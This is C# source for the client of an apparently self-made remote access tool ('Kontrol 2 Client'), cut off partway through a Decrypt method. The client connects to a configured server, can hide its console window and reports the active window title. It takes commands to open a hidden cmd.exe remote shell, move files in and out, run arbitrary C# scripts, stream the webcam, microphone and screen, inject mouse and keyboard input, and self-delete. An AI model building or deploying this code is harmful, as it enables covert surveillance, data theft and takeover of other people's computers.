using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge.Video;
using AForge.Video.DirectShow;
using NAudio.CoreAudioApi;
using NAudio.Wave;
using DeviceId;
using System.Speech.Synthesis;
using Microsoft.CSharp;
using System.Collections.Generic;
using System.CodeDom.Compiler;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;
using System.Runtime.Loader;
using System.Text.RegularExpressions;
using System.Runtime.ExceptionServices;

[assembly: log4net.Config.XmlConfigurator(Watch = true)]

namespace Kontrol_2_Client
{
	public class Client
	{
		//interopt and dll handling stuff
		[DllImport("user32.dll", CharSet = CharSet.Auto)]
		private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);

		private static readonly UInt32 SPI_SETDESKWALLPAPER = 0x14;
		private static readonly UInt32 SPIF_UPDATEINIFILE = 0x01;
		private static readonly UInt32 SPIF_SENDWININICHANGE = 0x02;

		public static void SetWallpaper(string path)
		{
			SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
		}
		private static WinEventDelegate dele = null;
		delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

		[DllImport("user32.dll")]
		static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);

		private const uint WINEVENT_OUTOFCONTEXT = 0;
		private const uint EVENT_SYSTEM_FOREGROUND = 3;

		[DllImport("user32.dll")]
		static extern IntPtr GetForegroundWindow();

		[DllImport("user32.dll")]
		static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

		private static string GetActiveWindowTitle()
		{
			const int nChars = 256;
			IntPtr handle = IntPtr.Zero;
			StringBuilder Buff = new StringBuilder(nChars);
			handle = GetForegroundWindow();

			if (GetWindowText(handle, Buff, nChars) > 0)
			{
				return Buff.ToString();
			}
			return null;
		}

		[DllImport("user32.dll", SetLastError = true)] 
		static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
		enum GetWindow_Cmd : uint
		{
			GW_HWNDFIRST = 0,
			GW_HWNDLAST = 1,
			GW_HWNDNEXT = 2,
			GW_HWNDPREV = 3,
			GW_OWNER = 4,
			GW_CHILD = 5,
			GW_ENABLEDPOPUP = 6
		}
		[StructLayout(LayoutKind.Sequential)]
		public struct POINTAPI
		{
			public int x;
			public int y;
		}
		public struct CURSORINFO
		{
			public Int32 cbSize;
			public Int32 flags;
			public IntPtr hCursor;
			public POINTAPI ptScreenPos;
		}
		[DllImport("user32.dll", EntryPoint = "SetCursorPos")]
		private static extern bool SetCursorPos(int x, int y);
		[DllImport("user32.dll")]
		public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
		public const int MOUSEEVENTF_LEFTDOWN = 0x02;
		private const int MOUSEEVENTF_RIGHTDOWN = 0x08; 
		[DllImport("user32.dll")]
		public static extern bool GetCursorInfo(out CURSORINFO pci);
		public const int MOUSEEVENTF_LEFTUP = 0x04;
		private const int MOUSEEVENTF_RIGHTUP = 0x10;
		[DllImport("user32.dll")]
		public static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
		[DllImport("user32.dll", SetLastError = true)]
		static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);
		[DllImport("user32.dll", CharSet = CharSet.Auto)] static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
		private const int WM_COMMAND = 0x111;
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, string windowTitle);
		[DllImport("user32.dll", SetLastError = false)]
		static extern IntPtr GetDesktopWindow();
		static IntPtr GetDesktopSHELLDLL_DefView()
		{
			var hShellViewWin = IntPtr.Zero;
			var hWorkerW = IntPtr.Zero;

			var hProgman = FindWindow("Progman", "Program Manager");
			var hDesktopWnd = GetDesktopWindow();

			// If the main Program Manager window is found
			if (hProgman != IntPtr.Zero)
			{
				// Get and load the main List view window containing the icons.
				hShellViewWin = FindWindowEx(hProgman, IntPtr.Zero, "SHELLDLL_DefView", null);
				if (hShellViewWin == IntPtr.Zero)
				{
					// When this fails (picture rotation is turned ON, toggledesktop shell cmd used ), then look for the WorkerW windows list to get the
					// correct desktop list handle.
					// As there can be multiple WorkerW windows, iterate through all to get the correct one
					do
					{
						hWorkerW = FindWindowEx(hDesktopWnd, hWorkerW, "WorkerW", null);
						hShellViewWin = FindWindowEx(hWorkerW, IntPtr.Zero, "SHELLDLL_DefView", null);
					} while (hShellViewWin == IntPtr.Zero && hWorkerW != IntPtr.Zero);
				}
			}
			return hShellViewWin;
		}
		[DllImport("kernel32.dll")]
		static extern IntPtr GetConsoleWindow();
		[DllImport("user32.dll")]
		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		private const byte SW_SHOW = 1;
		private const byte SW_HIDE = 0;
		public const Int32 CURSOR_SHOWING = 0x00000001;
		private static WinEventDelegate dale;

		//Forms
		private static ChatForm cf = new ChatForm();
		private static MainForm mf = new MainForm();

		//Global variables
		private static int _ID = 0;
		private static bool _DEBUG;
		private static string[] configFile = File.ReadAllText(@".\conf.t").Split(';');
		private static Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
		public static string ip = configFile[0];
		public static ushort PORT = ushort.Parse(configFile[1]);
		private static Process remoteShell;
		private static StreamReader fromShell;
		private static StreamWriter toShell;
		private static StreamReader error;
		private static byte fo_mode = 3; //3 = none, 0 = download, 1 = upload
		private static string fo_path = string.Empty;
		private static int fo_size = 0;
		private static int fo_writeSize = 0;
		private static byte[] fileBuffer;
		private static FilterInfoCollection videoDevices;
		private static VideoCaptureDevice videoSource;
		private static Encoding uniEncoder = Encoding.Unicode;
		private static WasapiLoopbackCapture internalSource = null;
		private static WaveInEvent audioSource = null;
		private static bool RemoteDekstop;

		//log4net
		private static readonly log4net.ILog log = log4net.LogManager.GetLogger(MethodBase.GetCurrentMethod().DeclaringType);

		public static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
		{
			if (_clientSocket.Connected)
			{
				Send("active_window\n" + _ID + "\n" + GetActiveWindowTitle());
				//printline("Active window: " + GetActiveWindowTitle());
			}
		}

		static void FirstChanceHandler(object source, FirstChanceExceptionEventArgs e)
		{
			if (!Directory.Exists(@".\dump")) Directory.CreateDirectory(@".\dump");
			if (!e.Exception.Message.StartsWith("No connection could be made because the target machine actively refused it."))
				log.Error(e.Exception.Message + "\n\t" + e.Exception.StackTrace);
		}

		[STAThread]
		static void Main(string[] args)
		{
			//AppDomain.CurrentDomain.FirstChanceException += FirstChanceHandler;
			new Thread(() =>
			{
				dele = new WinEventDelegate(WinEventProc);
				IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
			}).Start();

			isDebug();
			var handle = GetConsoleWindow();

			// Hide
			if (configFile[2] == "show")
				ShowWindow(handle, SW_SHOW);
			else if (configFile[2] == "hide")
				ShowWindow(handle, SW_HIDE);


			//Application.EnableVisualStyles();
			//Application.Run(mf);
			Execute();
		}

		public static void Execute()
		{
			Connect();
			RequestLoop();
		}

		[Conditional("DEBUG")]
		static void isDebug()
		{
			_DEBUG = true;
		}

		static void printline(string text)
		{
			if (_DEBUG) Console.WriteLine(text);
		}
		static void printline()
		{
			if (_DEBUG) Console.WriteLine();
		}
		static void printline(string text, params object?[]? args)
		{
			text = string.Format(text, args);
			if (_DEBUG) Console.WriteLine(text);
		}
		static void printline(object? obj)
		{
			if (_DEBUG) Console.WriteLine(obj.ToString());
		}
		static void print(string text)
		{
			if (_DEBUG) Console.Write(text);
		}
		static void print(string text, params object?[]? args)
		{
			text = string.Format(text, args);
			if (_DEBUG) Console.Write(text);
		}
		static void print(object? obj)
		{
			if (_DEBUG) Console.Write(obj.ToString());
		}

		private static void Connect()
		{
			int attempts = 0;

			while (!_clientSocket.Connected)
			{
				try
				{
					attempts++;
					print("\rConnection attempt {0}", attempts);
					_clientSocket.Connect(IPAddress.Parse(ip), PORT);
				}
				catch (SocketException)
				{
					//Console.Clear();
				}
			}

			//Console.Clear();
			printline("\nConnected!");
		}

		//Reciving commands from the server
		private static void RequestLoop()
		{
			while (true)
			{
				try
				{
					RecieveResponse();
				}
				catch (Exception ex)
				{
					//MessageBox.Show(ex.Message + "\n" + ex.StackTrace);
					_clientSocket.Shutdown(SocketShutdown.Both);
					_clientSocket.Close();
					_clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					if (videoSource != null)
					{
						videoSource.SignalToStop();
						videoSource.NewFrame -= new NewFrameEventHandler(videoSource_NewFrame);
						videoSource = null;
					}
					if (audioSource != null)
					{
						audioSource.StopRecording(); 
					}
					Connect();
					RequestLoop();
				}
			}
		}

		private static void RecieveResponse()
		{
			byte[] buffer = new byte[2048];
			int recieved = _clientSocket.Receive(buffer, SocketFlags.None);
			if (recieved == 0) return;
			byte[] data = new byte[recieved];
			Array.Copy(buffer, data, recieved);
			//string header = Encoding.Unicode.GetString(data, 0, 4);
			
			new Thread(() => //Multithreaded command processing
			{
				if (true)
				{
					string cmd = Encoding.Unicode.GetString(data);
					try
					{
						cmd = Decrypt(cmd);
					}
					catch
					{
						//Send("ERROR\n" + ex.Message);
					}
					if (fo_mode == -1) printline("Recieved: {0}", cmd); //empty check
					if (cmd.StartsWith("getinfo-"))
					{
						try
						{
							var dev = new DeviceIdBuilder().AddMacAddress(true).AddMachineName().AddOsVersion().AddUserName();
							_ID = int.Parse(cmd.Split('-')[1]); //get own id
							string allinfo = string.Format("infoback-\n{0}\n{1}\n{2}\n{3}\n{4}\n{5}\n{6}\n{7}\n{8}", _ID, Environment.MachineName, DateTime.Now, Environment.OSVersion, Environment.UserName, dev, Assembly.GetExecutingAssembly().GetName().Version.ToString(), IsAdmin().ToString(), GetActiveWindowTitle());
							Send(allinfo);
						}
						catch (Exception ex)
						{
							printline(ex.Message);
						}
					}
					else if (cmd.StartsWith("chatform_open"))
					{
						cf.Show();
						mf.Invoke(new MethodInvoker(delegate 
						{
							cf.Show();
						}));
					}
					else if (cmd.StartsWith("chatform_close"))
					{
						mf.Invoke(new MethodInvoker(delegate
						{
							cf.Close();
						}));
						cf = new ChatForm();
					}
					else if (cmd.StartsWith("chat_in"))
					{
						cf.AppendText(cmd.Substring(cmd.IndexOf("@{msg}") + 6), cmd.Split('\n')[1]);
					}
					else if (cmd == "conditions_exit")
					{
						Environment.Exit(0);
					}
					else if (cmd == "conditions_showSelf")
					{
						Process.Start(Environment.GetEnvironmentVariable("WINDIR") + @"\explorer.exe", AppDomain.CurrentDomain.BaseDirectory);
					}
					else if (cmd == "conditions_selfDestruct")
					{
						// :(
						string args = string.Empty;
						//string loc = Path.Join(AppDomain.CurrentDomain.BaseDirectory, AppDomain.CurrentDomain.FriendlyName + ".exe");
						var psi = new ProcessStartInfo("cmd.exe", "/c" + "ping 127.0.0.1 && echo j | rmdir \"" + AppDomain.CurrentDomain.BaseDirectory + "\" /S /Q & cmd /k");

						args += "ping 127.0.0.1 > nul\n"; 
						args += "echo j | rmdir \"";
						args += AppDomain.CurrentDomain.BaseDirectory + "\" /S /Q";

						psi.CreateNoWindow = true;
						psi.UseShellExecute = true;
						Process.Start(psi);
						Environment.Exit(0);

						Process.Start("cmd.exe", "/c" + args);
					}
					else if (cmd == "conditions_getSelfContainedAssemblies")
					{
						string assemblies = "";
						foreach (string dll in Directory.GetFiles(AppDomain.CurrentDomain.BaseDirectory, "*.dll"))
						{
							try
							{
								var assembly = AssemblyName.GetAssemblyName(dll);
								assemblies += assembly.Name + "\n";
							}
							catch { continue; }
						}
						assemblies = assemblies.Substring(0, assemblies.Length - 2);
						Send($"conditions_scasm\n{assemblies}");
					}
					else if (cmd == "system_shutdown")
					{
						var psi = new ProcessStartInfo(Path.Join(Environment.SystemDirectory, "shutdown.exe"), "/s /t 0");
						psi.CreateNoWindow = true;
						psi.UseShellExecute = false;
						Process.Start(psi);
					}
					else if (cmd == "system_restart")
					{
						var psi = new ProcessStartInfo(Path.Join(Environment.SystemDirectory, "shutdown.exe"), "/r /t 0");
						psi.CreateNoWindow = true;
						psi.UseShellExecute = false;
						Process.Start(psi);
					}
					else if (cmd == "system_sleep")
					{
						Application.SetSuspendState(PowerState.Hibernate, true, true);
					}
					else if (cmd.StartsWith("cd"))
					{
						try
						{
							string path = cmd.Split('\n')[1];
							if (Directory.Exists(path))
							{
								string[] dirs = Directory.GetDirectories(path);
								string[] files = Directory.GetFiles(path);
								string dir_infos = "";
								string file_infos = "";

								foreach (string dir in dirs)
								{
									file_infos += (Path.GetFileName(Path.GetFullPath(dir).TrimEnd(Path.DirectorySeparatorChar)) + "&" + GetDirectorySize(dir) + "&" + Directory.GetCreationTimeUtc(dir).ToString() + "&" + dir + "&dir") + "\n";
								}

								foreach (string file in files)
								{
									dir_infos += (Path.GetFileName(file) + "&" + new FileInfo(file).Length.ToString() + "&" + File.GetCreationTimeUtc(file).ToString() + "&" + file + "&file") + "\n";
								}
								Send($"dir_info#{path}#" + file_infos + dir_infos);
							}
						}
						catch { }
					}
					else if (cmd == "list_drives")
					{
						string infos = "";
						DriveInfo[] drives = DriveInfo.GetDrives();

						foreach (DriveInfo drive in drives)
						{
							if (drive.IsReady)
							{
								infos += drive.Name + "&" + drive.TotalSize + "\n";
							}
							else
							{
								infos += drive.Name + "&" + "N/A\n";
							}
						}
						Send("drive_infos#" + infos);
					}
					else if (cmd.StartsWith("file_operation"))
					{
						string[] xsplit = cmd.Split('\n');
						string mode = null;
						string src = null;
						string dest = null;
						string args = null;
						dynamic src_attr = null;
						dynamic dest_attr = null;
						try
						{
							mode = xsplit[1];
							src = xsplit[2];
							dest = xsplit[3];
							args = xsplit[4];
						}
						catch { }
						switch (mode)
						{
							case "file_move":
								//dest_attr = File.GetAttributes(dest);
								dest_attr = File.GetAttributes(dest);
								if ((dest_attr & FileAttributes.Directory) != FileAttributes.Directory) //destination path must be a directory!
								{
									dest = Path.GetDirectoryName(dest);
								}
								if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory) //same thing above but on the source
								{
									dest = Path.Combine(dest, Path.GetFileName(src));
									Directory.Move(src, dest);
								}
								else
								{
									dest = Path.Combine(dest, Path.GetFileName(src));
									File.Move(src, dest);
								}
								break;
							case "file_copy":
								//dest_attr = File.GetAttributes(dest);
								dest_attr = File.GetAttributes(dest);
								if ((dest_attr & FileAttributes.Directory) != FileAttributes.Directory) //destination path must be a directory!
								{
									dest = Path.GetDirectoryName(dest);
								}
								if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory) //same thing above but on the source
								{
									dest = Path.Combine(dest, Path.GetFileName(src));
									if (Directory.Exists(dest))
									{
										dest += " - Copy";
									}
									MessageBox.Show(dest);
									DirectoryCopy(src, dest, true);
								}
								else
								{
									if (File.Exists(Path.Combine(dest, Path.GetFileName(src))))
									{
										dest = Path.Combine(dest, Path.GetFileNameWithoutExtension(src) + " - Copy" + Path.GetExtension(src));
									}
									else
									{
										dest = Path.Combine(dest, Path.GetFileName(src));
									}
									File.Copy(src, dest);
								}
								Send("dir_refresh");
								break;
							case "file_delete":
								if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory)
								{
									Directory.Delete(src);
								}
								else
								{
									File.Delete(src);
								}
								Send("dir_refresh");
								break;
							case "file_rename":
								if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory)
								{
									Directory.Move(src, dest);
								}
								else
								{
									File.Move(src, dest);
								}
								Send("dir_refresh");
								break;
							case "file_open":
								try
								{
									ProcessStartInfo proc = new ProcessStartInfo();
									proc.UseShellExecute = true;
									proc.FileName = src;
									Process.Start(proc);
								}
								catch { }
								break;
							case "file_create":
								if (Path.HasExtension(src))
								{
									File.Create(src);
								}
								else
								{
									Directory.CreateDirectory(src);
								}
								Send("dir_refresh");
								break;
							case "file_download":
								fo_writeSize = 0;
								fo_path = Path.Combine(src, dest);
								fo_size = int.Parse(args);
								fileBuffer = new byte[fo_size];
								fo_mode = 0;
								Send("file_operation\nfile_beginUpload");
								//DownloadFile(null, null);
								break;
							case "file_upload":
								fo_path = src;
								Send("file_operation\nfile_beginDownload\n" + new FileInfo(fo_path).Length);
								fo_mode = 1;
								break;
							case "file_beginUpload":
								Thread.Sleep(1000);
								try
								{
									printline($"File size: {SendBytes(File.ReadAllBytes(fo_path))} bytes");
								}
								catch { }
								fo_mode = 3;
								/*NetworkStream ns = new NetworkStream(_clientSocket);
								using (FileStream fs = new FileStream(fo_path, FileMode.Open, FileAccess.Read))
								{
									long fileSize = fs.Length;
									long writeSize = 0;
									int count = 0;
									byte[] data = new byte[1024 ^ 8]; //8Kb buffer .. you might use a smaller size also.
									while (writeSize < fileSize)
									{
										count = fs.Read(data, 0, data.Length);
										if (count != data.Length)
											Array.Resize(ref data, count);
										ns.Write(data, 0, count);
										//SendBytes(data);
										writeSize += count;
										Console.Title = writeSize.ToString();
									}
									ns.Flush();
								}*/
								break;
							case "file_uploadFinished":
								fo_mode = 3;
								break;
						}
					}
					else if (cmd == "list_proceses")
					{
						Process[] procs = Process.GetProcesses();
						foreach (Process proc in procs)
						{
							string name = proc.ProcessName;
							string responding = proc.Responding.ToString();
							string title = proc.MainWindowTitle;
							string priority = "N/A";
							string path = "N/A";
							string pid = proc.Id.ToString();
							try
							{
								priority = proc.PriorityClass.ToString();
								path = proc.Modules[0].FileName;

								string proc_info = "process_info\n" + name + "\n" + pid + "\n" + responding + "\n" + title + "\n" + priority + "\n" + path;
								Send(proc_info);
								Thread.Sleep(10); //Let's be a good citizen to the network
							}
							catch { }
						}
					}
					else if (cmd.Split('\n')[0] == "kill_process")
					{
						try
						{
							Process.GetProcessById(int.Parse(cmd.Split('\n')[1])).Kill();
						}
						catch { }
					}
					else if (cmd.Split('\n')[0] == "create_process")
					{
						try
						{
							string[] xsplit = cmd.Split('\n');
							Process proc = new Process();
							switch (int.Parse(xsplit[1]))
							{
								case -1:
									proc.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
									break;
								case 0:
									proc.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
									break;
								case 1:
									proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
									proc.StartInfo.CreateNoWindow = true;
									break;
								case 2:
									proc.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
									break;
								case 3:
									proc.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
									break;
							}
							if (!string.IsNullOrEmpty(xsplit[3]))
							{
								if (!bool.Parse(xsplit[4]))
									proc.StartInfo.Arguments = "/C " + xsplit[3];
								else
									proc.StartInfo.Arguments = xsplit[3];
							}
							proc.StartInfo.UseShellExecute = bool.Parse(xsplit[5]);
							proc.StartInfo.WorkingDirectory = Path.GetDirectoryName(xsplit[2]);
							proc.StartInfo.FileName = xsplit[2];
							proc.Start();
						}
						catch { }
					}
					else if (cmd == "start_remoteshell")
					{
						ProcessStartInfo procinfo = new ProcessStartInfo();
						procinfo.FileName = "cmd.exe";
						procinfo.CreateNoWindow = true;
						procinfo.UseShellExecute = false;
						procinfo.RedirectStandardOutput = true;
						procinfo.RedirectStandardInput = true;
						procinfo.RedirectStandardError = true;

						remoteShell = new Process();
						remoteShell.StartInfo = procinfo;
						remoteShell.Start();
						toShell = remoteShell.StandardInput;
						fromShell = remoteShell.StandardOutput;
						error = remoteShell.StandardError;
						toShell.AutoFlush = true;

						try
						{
							string tempBuf = "";
							string tempError = "";
							string edata = "";
							string sdata = "";

							while ((tempBuf = fromShell.ReadLine()) != null && !remoteShell.HasExited)
							{
								sdata += tempBuf + "\r";
								Send("cmd_out\n" + sdata);
								sdata = "";
								Thread.Sleep(20); //Let's be friendly to the network bandwidth :)
							}
							while ((tempError = error.ReadLine()) != null && !remoteShell.HasExited)
							{
								edata += edata + tempError + "\r";
								Send("cmd_out\n" + edata);
								edata = "";
								Thread.Sleep(20); //Let's be friendly to the network bandwidth :)
							}
						}
						catch (Exception ex)
						{
							MessageBox.Show(ex.Message + "\n" + ex.StackTrace);
							Send("cmdout\nError while trying to read from the shell: " + ex.Message);
						}
					}
					else if (cmd.StartsWith("cmd_in"))
					{
						toShell.WriteLine(cmd.Split('\n')[1]);
					}
					else if (cmd == "cmd_kill")
					{
						remoteShell.Kill();
					}
					else if (cmd.StartsWith("exec_csscript"))
					{
						try
						{
							string[] xsplit = cmd.Split('\n');
							string[] refs = xsplit[1].Split('@');
							xsplit[0] = string.Empty; xsplit[1] = string.Empty;
							RunCSScript(string.Join('\n', xsplit), refs);
						}
						catch { }
					}
					else if (cmd.StartsWith("element"))
					{
						string element = cmd.Split('\n')[1];
						string action = cmd.Split('\n')[2];

						switch (element)
						{
							case "taskbar":
								if (action == "hide")
									HTaskBar(true);
								else
									HTaskBar(false);
								break;
							case "desktopIcons":
								if (action == "hide")
									HDesktop();
								else
									HDesktop();
								break;
							case "trayIcons":
								if (action == "hide")
									HTrayIcons(true);
								else
									HTrayIcons(false);
								break;
							case "startMenu":
								if (action == "hide")
									HStart(true);
								else
									HStart(false);
								break;
							case "clock":
								if (action == "hide")
									HClock(true);
								else
									HClock(false);
								break;
						}
					}
					else if (cmd.Split('\n')[0] == "play_systemsound")
					{
						switch (int.Parse(cmd.Split('\n')[1]))
						{
							case 0:
								SystemSounds.Hand.Play();
								break;
							case 1:
								SystemSounds.Beep.Play();
								break;
						}
					}
					else if (cmd == "play_soundfile")
					{


					}
					else if (cmd.Split('\n')[0] == "t2s_read")
					{
						TextToSpeech(cmd.Split('\n')[1]);
					}
					else if (cmd.Split('\n')[0] == "play_frequency")
					{
						string[] xsplit = cmd.Split('\n');
						Console.Beep(int.Parse(xsplit[1]), int.Parse(xsplit[2]));
					}
					else if (cmd.StartsWith("remote_webcam"))
					{
						try
						{
							string[] xsplit = cmd.Split('\n');
							switch (xsplit[1])
							{
								case "capture_devices":
									int i = 0;
									string devices = "";
									videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
									foreach (FilterInfo device in videoDevices)
									{
										if (i == videoDevices.Count - 1)
											devices += device.Name;
										else
											devices += device.Name + "&";
										i++;
									}
									Send("remote_webcam\ndevices\n" + devices);
									break;
								case "device_resolutions":
									string resolutions = "";
									videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
									videoSource = new VideoCaptureDevice(videoDevices[int.Parse(xsplit[2])].MonikerString);
									for (int x = 0; x < videoSource.VideoCapabilities.Length; x++)
									{
										string resolution_size = videoSource.VideoCapabilities[x].FrameSize.ToString();
										printline(resolution_size);
										if (x == videoSource.VideoCapabilities.Length)
											resolutions += resolution_size;
										else
											resolutions += resolution_size + "&";
									}
									Send("remote_webcam\ndevice_resolutions\n" + resolutions);
									break;
								case "begin_stream":
									string[] args = xsplit[2].Split('&');
									Send("remote_webcam\nstart_display");
									WebCam_Stream(int.Parse(args[0]), int.Parse(args[1]), int.Parse(args[2]));
									break;
								case "end_stream":
									videoSource.SignalToStop();
									videoSource.NewFrame -= new NewFrameEventHandler(videoSource_NewFrame);
									videoSource = null;
									videoDevices = null;
									break;
							}
						}
						catch { }
					}
					else if (cmd.StartsWith("remote_audio"))
					{
						string[] xsplit = cmd.Split('\n');
						switch (xsplit[1])
						{
							case "audio_devices":
								int y = 0;
								int len = 0;
								string devices_str = "";
								var enu = new MMDeviceEnumerator();
								foreach (var dev in enu.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active)) len++;
								int devices = WaveIn.DeviceCount;
								for (int i = 0; i < devices; i++)
								{
									WaveInCapabilities device = WaveIn.GetCapabilities(i);
									if (i == devices)
										devices_str += "C: " + device.ProductName;
									else
										devices_str += "C: " + device.ProductName + "&";
								}
								foreach (var dev in enu.EnumerateAudioEndPoints(DataFlow.Render, DeviceState.Active))
								{
									printline($"@! Device: {dev.DataFlow} {dev.FriendlyName} {dev.DeviceFriendlyName} {dev.State} {dev.ID}");
									if (y == len)
										devices_str += "R: " + dev.FriendlyName + "ID: " + dev.ID;
									else
										devices_str += "R: " + dev.FriendlyName + "ID: " + dev.ID + "&";
									y++;
								}
								Send("remote_audio\naudio_devices\n" + devices_str);
								break;
							case "begin_stream":
								if (xsplit[3] == "renderer")
								{
									var capDev = new WasapiLoopbackCapture(new MMDeviceEnumerator().GetDevice(xsplit[2]));
									Send("remote_audio\n-5\n" + capDev.WaveFormat.SampleRate + "\n" + capDev.WaveFormat.Channels);
									try
									{
										Audio_Stream(captureDevice: capDev);
									}
									catch (Exception ex)
									{
										Send("display_msgbox\nAn Error occured on the client side\n1\n1\n@{msg}Error: Either device is in use or something's wrong with my code.\nClick 'OK' to see the full exception.");
										Send("display_msgbox\nAn Error on the client side\n" + "1\n1" + "\n@{msg}Error: " + ex.Message + "\nStack Trace:" + ex.StackTrace);
									}
								}
								else
								{
									Send("remote_audio\n0");
									Audio_Stream(int.Parse(xsplit[2]));
								}
								break;
							case "end_stream":
								if (internalSource == null)
								{
									//audioSource.DataAvailable -= audioSource_NewAudio;
									audioSource.StopRecording();
								}
								else
								{
									//internalSource.DataAvailable -= audioSource_NewAudio;
									internalSource.StopRecording();
								}
								break;
						}
					}
					else if (cmd.StartsWith("remote_desktop"))
					{
						string[] xsplit = cmd.Split('\n');
						switch (xsplit[1])
						{
							case "begin_stream":
								RemoteDekstop = true;
								Screen_Stream(xsplit[3], captureCursor: Convert.ToBoolean(xsplit[6]), quality: int.Parse(xsplit[5]));
								break;
							case "end_stream":
								RemoteDekstop = false;
								break;
							case "smcord":
								try
								{
									SetCursorPos(int.Parse(xsplit[2]), int.Parse(xsplit[3]));
								}
								catch { }
								break;
							case "kpress":
								try
								{
									SendKeys.SendWait(xsplit[2]);
								}
								catch { }
								break;
							case "lmclk":
								try
								{
									MouseClick(int.Parse(xsplit[2]), int.Parse(xsplit[3]));
								}
								catch { }
								break;
							case "rmclk":
								try
								{
									MouseClick(int.Parse(xsplit[2]), int.Parse(xsplit[3]), 1);
								}
								catch { }
								break;
						}

					}
					else if (cmd.StartsWith("display_msgbox"))
					{
						string[] xsplit = cmd.Split('\n');
						if (xsplit.Length <= 1) xsplit = cmd.Split("\\n");
						MessageBoxIcon icon = MessageBoxIcon.None;
						MessageBoxButtons buttons = MessageBoxButtons.OK;
						Console.WriteLine(xsplit.Length);
						switch (int.Parse(xsplit[2]))
						{
							case 0:
								icon = MessageBoxIcon.Asterisk;
								break;
							case 1:
								icon = MessageBoxIcon.Error;
								break;
							case 2:
								icon = MessageBoxIcon.Exclamation;
								break;
							case 3:
								icon = MessageBoxIcon.Hand;
								break;
							case 4:
								icon = MessageBoxIcon.Information;
								break;
							case 5:
								icon = MessageBoxIcon.None;
								break;
							case 6:
								icon = MessageBoxIcon.Question;
								break;
							case 7:
								icon = MessageBoxIcon.Stop;
								break;
							case 8:
								icon = MessageBoxIcon.Warning;
								break;
						}
						switch (int.Parse(xsplit[3]))
						{
							case 0:
								buttons = MessageBoxButtons.AbortRetryIgnore;
								break;
							case 1:
								buttons = MessageBoxButtons.OK;
								break;
							case 2:
								buttons = MessageBoxButtons.OKCancel;
								break;
							case 3:
								buttons = MessageBoxButtons.RetryCancel;
								break;
							case 4:
								buttons = MessageBoxButtons.YesNo;
								break;
							case 5:
								buttons = MessageBoxButtons.YesNoCancel;
								break;
						}
						MessageBox.Show(cmd.Substring(cmd.IndexOf("@{msg}") + 6), xsplit[1], buttons, icon);
					}
					else if (fo_mode == 0)
					{
						DownloadFile(data, recieved);
					}
				}
			}).Start();
		}
		public static string Encrypt(string text)
		{
			/*string key = "D(G+KbPeSg";
			byte[] clearBytes = Encoding.Unicode.GetBytes(text);
			using (Aes encryptor = Aes.Create())
			{
				Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
				encryptor.Key = pdb.GetBytes(32);
				encryptor.IV = pdb.GetBytes(16);

				using (MemoryStream ms = new MemoryStream())
				{
					using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cs.Write(clearBytes, 0, clearBytes.Length);
						cs.Close();
					}
					text = Convert.ToBase64String(ms.ToArray());
				}
			}*/
			return text;
		}
		public static string Decrypt(string text)
		{
			/*string key = "D(G+KbPeSg";
			byte[] cipherBytes = Convert.FromBase64String(text);
			using (Aes encryptor = Aes.Create())
			{
				Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
				encryptor.Key = pdb.GetBytes(32);
				encryptor.IV = pdb.GetBytes(16);

				using (MemoryStream ms = new MemoryStream())
				{
					using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cs.Write(cipherBytes, 0, cipherBytes.Length);
						cs.Close();
					}
					text = Encoding.Unicode.GetString(ms.ToArray());
				}
			}*/
